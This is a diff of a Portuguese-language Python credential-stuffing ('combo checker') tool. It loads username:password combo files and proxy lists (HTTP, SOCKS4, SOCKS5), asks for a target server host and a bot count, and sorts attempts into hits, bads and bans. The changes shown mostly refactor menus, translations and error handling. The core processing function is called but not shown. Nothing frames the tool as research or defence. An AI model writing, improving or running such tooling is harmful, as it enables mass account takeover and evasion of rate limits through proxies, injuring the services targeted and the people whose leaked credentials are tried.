-        print(f"{cor.azul}2. {t.get('change_os', 'Alterar sistema operacional')} (Atual: {config['sistema_operacional'] or 'Não configurado'}){cor.reset}")
-        print(f"{cor.azul}3. {t.get('save_exit', 'Salvar e voltar')}{cor.reset}")
-        
+        banner(config, t)
+        print(f"\n{cor.ciano}  === {t('settings_title', 'CONFIGURAÇÕES')} ==={cor.reset}")
+        print(f"{cor.azul}  = 1. {t('change_language')} (Atual: {config['idioma']}){cor.reset}")
+        print(f"{cor.azul}  = 2. {t('change_os', 'Alterar sistema operacional')} (Atual: {config['sistema_operacional'] or 'Não configurado'}){cor.reset}")
+        print(f"{cor.azul}  = 3. {t('save_exit', 'Salvar e voltar')}{cor.reset}")
+        print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+
         escolha = input(f"{cor.verde}>> {cor.reset}").strip()
         
         if escolha == "1":
             config["idioma"] = selecionar_idioma()
         elif escolha == "2":
-            config["sistema_operacional"] = escolher_sistema_operacional(t)
+            config["sistema_operacional"] = escolher_sistema_operacional(config, t)
         elif escolha == "3":
             salvar_configuracao(config)
             break
         else:
-            print(f"{cor.vermelho}{t.get('invalid_option', 'Opção inválida!')}{cor.reset}")
+            print(f"{cor.vermelho}{t('invalid_option')}{cor.reset}")
 
 def selecionar_idioma():
     """Permite ao usuário escolher um idioma"""
@@ -625,65 +689,82 @@ def selecionar_idioma():
 # FUNÇÃO PRINCIPAL
 # ==============================================
 def main():
-    # Carrega configurações existentes
     config = carregar_configuracoes()
-    
-    # Verifica se o SO já está configurado
+    t = criar_t(config)
+
+    # Se ainda não escolheu sistema operacional
     if not config.get("sistema_operacional"):
-        t = carregar_idioma(config["idioma"]).get("translations", {})
-        config["sistema_operacional"] = escolher_sistema_operacional(t)
+        config["sistema_operacional"] = escolher_sistema_operacional(config, t)
         config["configurado"] = True
+        salvar_configuracao(config)
+
+    # Se ainda não escolheu idioma
+    if not config.get("idioma"):
+        banner(config, t)
+        print(f"\n  {cor.amarelo}Idioma não configurado. Selecione o idioma:{cor.reset}")
+        config["idioma"] = selecionar_idioma()
         salvar_configuracao(config)
 
     # Menu principal
     while True:
-        escolha = mostrar_menu_principal(config)
+        escolha = mostrar_menu_principal(config, t)
         if escolha == "1":
             break
         elif escolha == "2":
-            mostrar_menu_configuracoes(config)
+            mostrar_menu_configuracoes(config, t)
 
+    # Perguntar o host do servidor
+    banner(config, t)
+    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+    print(f"  {cor.atention}{t("questions.server_host")}{cor.reset}")
+    print(f'  {cor.ciano}{"=" * 26}{cor.reset}\n')
+    server = input(f"{cor.verde}  {t("responses.response")} >>> {cor.reset}")
+    server = limpar_host(server)
+    if not server:
+        print(f"{cor.vermelho}\n  {t("responses.invalid_host")}{cor.reset}")
+        return
+
+    banner(config, t)
     # Resto do código
     sistema_operacional = config["sistema_operacional"]
     caminho_base = determinar_caminho_base(sistema_operacional)
     
     if not caminho_base:
-        print(f"{cor.vermelho}Sistema operacional não suportado.{cor.reset}")
+        print(f"{cor.vermelho}  {t('responses.system_not_suported')}{cor.reset}")
         return
 
-    # Carrega traduções
-    t = carregar_idioma(config["idioma"]).get("translations", {})
-    
     # Define os caminhos das pastas
-    pasta_combo = os.path.join(caminho_base, "combo")
-    pasta_proxy = os.path.join(caminho_base, "proxy")  # Usa o mesmo caminho_base
-    pasta_hits = os.path.join(caminho_base, "hits")
+    pasta_combo = os.path.join(caminho_base, "Combo")
+    pasta_proxy = os.path.join(caminho_base, "Proxy")
+    pasta_hits = os.path.join(caminho_base, "Hits")
 
     # Criar pastas se não existirem
     for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
         if not os.path.exists(pasta):
-            print(f"{cor.amarelo}Criando pasta: {pasta}{cor.reset}")
+            print(f"{cor.amarelo}  {t('responses.creating_folder_combo')} {pasta}{cor.reset}")
             os.makedirs(pasta)
 
-    # Exemplo de como adaptar uma parte do código original:
-    print(banner)
-    print(f"'Escolha o arquivo de combo: ")
+    arquivo_combo = escolher_arquivo(pasta_combo, t, tipo="combo")
     
-    arquivo_combo = escolher_arquivo(pasta_combo, t.get('combo_folder', 'combo'))
     if not arquivo_combo:
         return
 
     # Perguntar se deseja usar proxy
-    usar_proxy = input(f"{cor.verde}Deseja usar proxy? (1 para Sim, 2 para Não) > {cor.reset}")
+    banner(config, t)
+    print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+    print(f"  {cor.atention}{t("questions.confirm_proxy")}{cor.reset}")
+    print(f"  {cor.azul}1. {t("questions.yes")}\n  2. {t("questions.no")}")
+    print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+    usar_proxy = input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}")
     if usar_proxy not in ["1", "2"]:
-        print(f"{cor.vermelho}Escolha inválida. Digite 1 para Sim ou 2 para Não.{cor.reset}")
+        print(f"\n  {cor.vermelho}{t("questions.error_question_proxy")}{cor.reset}")
         return
 
     proxies = []
     tipo_proxy = None  # Inicializa tipo_proxy como None
     if usar_proxy == "1":
-        print(f"{cor.ciano}Escolha o arquivo de proxy:{cor.reset}")
-        arquivo_proxy = escolher_arquivo(pasta_proxy, "proxy")
+        banner(config, t)
+        arquivo_proxy = escolher_arquivo(pasta_proxy, t, tipo="proxy")
         if not arquivo_proxy:
             return
 
@@ -692,34 +773,34 @@ def main():
             proxies = [linha.strip() for linha in f.readlines()]
 
         # Escolher tipo de proxy
-        print(f"{cor.ciano}Escolha o tipo de proxy:{cor.reset}")
-        print(f"{cor.azul}1. HTTP/HTTPS{cor.reset}")
-        print(f"{cor.azul}2. SOCKS4{cor.reset}")
-        print(f"{cor.azul}3. SOCKS5{cor.reset}")
+        banner(config, t)
+        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+        print(f"{cor.atention}  {t("questions.proxy_type")}{cor.reset}")
+        print(f"{cor.azul}  1. HTTP/HTTPS{cor.reset}")
+        print(f"{cor.azul}  2. SOCKS4{cor.reset}")
+        print(f"{cor.azul}  3. SOCKS5{cor.reset}")
+        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
         try:
-            tipo_proxy = int(input(f"{cor.verde}Digite o número do tipo de proxy > {cor.reset}"))
+            tipo_proxy = int(input(f"\n  {cor.verde}{t('responses.response')} >>> {cor.reset}"))
             if tipo_proxy not in [1, 2, 3]:
-                print(f"{cor.vermelho}Tipo de proxy inválido.{cor.reset}")
+                print(f"\n  {cor.vermelho}{t("questions.error_type_proxy")}{cor.reset}")
                 return
         except ValueError:
-            print(f"{cor.vermelho}Entrada inválida. Digite um número.{cor.reset}")
+            print(f"{cor.vermelho}\n  {t("responses.invalid_type_proxy")}{cor.reset}")
             return
 
     # Perguntar o número de bots
     try:
-        num_bots = int(input(f"{cor.verde}Digite o número de bots > {cor.reset}"))
+        banner(config, t)
+        print(f'\n  {cor.ciano}{"=" * 26}{cor.reset}')
+        print(f"{cor.atention}  {t("questions.number_of_bots")}{cor.reset}")
+        print(f'  {cor.ciano}{"=" * 26}{cor.reset}')
+        num_bots = int(input(f"{cor.verde}\n  {t("responses.response")} >>> {cor.reset}"))
         if num_bots < 1:
-            print(f"{cor.vermelho}Número de bots inválido. Deve ser pelo menos 1.{cor.reset}")
+            print(f"{cor.vermelho}{t("responses.invalid_number_of_bots")}{cor.reset}")
             return
     except ValueError:
-        print(f"{cor.vermelho}Entrada inválida. Digite um número.{cor.reset}")
-        return
-
-    # Perguntar o host do servidor
-    server = input(f"{cor.verde}Digite o host do servidor (exemplo: meu.servidor.com) > {cor.reset}")
-    server = limpar_host(server)
-    if not server:
-        print(f"{cor.vermelho}Host inválido.{cor.reset}")
+        print(f"{cor.vermelho}{t("responses.invalid_input_number")}{cor.reset}")
         return
 
     # Ler combos (usuário:senha)
@@ -735,10 +816,10 @@ def main():
                 linhas_invalidas += 1
 
     if linhas_invalidas > 0:
-        print(f"{cor.amarelo}Removendo {linhas_invalidas} linhas inválidas.{cor.reset}")
+        print(f"{cor.amarelo}{t("responses.removing_invalid_lines").format(linhas_invalidas=linhas_invalidas)}{cor.reset}")
 
     if not combos:
-        print(f"{cor.vermelho}Nenhum combo válido encontrado no arquivo.{cor.reset}")
+        print(f"{cor.vermelho}{t("responses.no_valid_combo_found")}{cor.reset}")
         return
 
     # Configurar headers personalizados
@@ -766,11 +847,15 @@ def main():
     # Processar combos com múltiplos bots
     hits, bads, bans = processar_combos(
     combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo, usar_proxy,
-    arquivo_proxy if usar_proxy == "1" else None  # Passa None se não estiver usando proxy
-)
+    arquivo_proxy if usar_proxy == "1" else None, config, t)
 
     # Exibir resumo final simplificado
-    print(f"\n{cor.magenta}Obrigado por usar a py, volte sempre! Config by DeepSeek e @ReyFxck{cor.reset}")
+    print(f"\n{cor.magenta}{t("menu.exit_message_1")}{cor.reset}")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        print(f"\n{cor.vermelho}  CRITICAL ERROR: {e}{cor.reset}")
+        traceback.print_exc()
+        input("Pressione Enter para sair...")
